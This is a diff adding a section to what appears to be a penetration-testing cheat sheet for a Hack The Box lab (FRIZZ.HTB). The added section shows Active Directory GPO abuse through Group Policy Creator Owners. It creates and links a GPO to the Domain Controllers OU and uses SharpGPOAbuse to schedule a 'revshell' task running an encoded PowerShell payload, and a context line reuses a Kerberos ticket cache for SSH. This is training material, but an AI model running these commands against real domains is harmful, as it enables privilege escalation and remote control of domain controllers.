@@ -954,3 +954,21 @@ KRB5CCNAME=f.frizzle.ccache ssh -K <user>@<domain>
 ```
 
 </details>
+
+---
+<details>
+  <summary><strong>Group Policy Creator Owners</strong></summary>
+
+- https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7
+```powershell
+New-GPO -name "0xdf"
+
+# DC의 Distinguished Name
+New-GPLink -Name "0xdf" -target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB"
+
+.\SharpGPOAbuse.exe --addcomputertask --GPOName "ippsec" --Author "ippsec" --TaskName "revshell" --Command "powershell.exe" --Arguments "powershell -enc <base64>"
+
+gpupdate /force
+```
+  
+</details>
